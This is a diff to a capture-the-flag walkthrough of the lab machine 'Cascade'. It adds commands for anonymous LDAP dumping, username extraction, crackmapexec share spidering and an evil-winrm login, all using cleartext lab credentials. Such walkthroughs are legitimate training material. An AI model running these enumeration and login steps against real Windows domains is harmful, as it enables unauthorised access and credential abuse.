@@ -18,6 +18,24 @@ Then dump LDAP
 ```bash
 ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' > ldap_anon
 ```
+Enumerate usernames, to try to find username conventions
+```bash
+cat ldap_anon | grep sAMAccountName
+```
+This shows a naming convention of f.lastname
+```
+s.smith
+r.thompson
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+b.hanson
+d.burman
+j.allen
+i.croft
+```
 Check for unique values. Which finds a legacyPwd.
 ```bash
 cat ldap_anon | sort | uniq -c | sort -nr
@@ -98,7 +116,11 @@ User flag
 3a48ee5fd948da5862bad545d8f3e1e0
 ```
 
-Checking audit share
+```bash
+crackmapexec smb 10.10.10.182 -u s.smith -p sT333ve2 -M spider_plus
+```
+This shows a new audit share with 3 interesting files.
+
 runAudit.bat, cascaudit.exe, casccrypt.dll
 
 Reverse engineer the exe to return the output from line 44.
@@ -114,7 +136,9 @@ sqlite3 Audit.db .dump
 ```
 Password was for ArkSvc
 Login with evil-winrm
-
+```bash
+evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
+```
 Check privs
 
 member of the recycle bin group?
